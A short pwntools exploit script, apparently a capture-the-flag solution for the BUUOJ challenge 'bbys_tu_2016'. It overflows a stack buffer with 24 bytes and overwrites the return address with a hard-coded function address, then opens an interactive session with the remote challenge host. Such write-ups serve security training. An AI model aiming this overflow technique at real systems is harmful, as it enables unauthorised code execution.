#Made by fly_autumn
#x86
from pwn import *
#p = process("./bbys_tu_2016")
p = remote("node5.buuoj.cn",27769)
elf = ELF("./bbys_tu_2016")
context(os="linux",arch="i386")

offset = 24
func_plt = 0x804856d
payload = b"\x00" * offset + p32(func_plt)
#p.recvuntil(b"it.\n")
p.sendline(payload)

p.interactive()
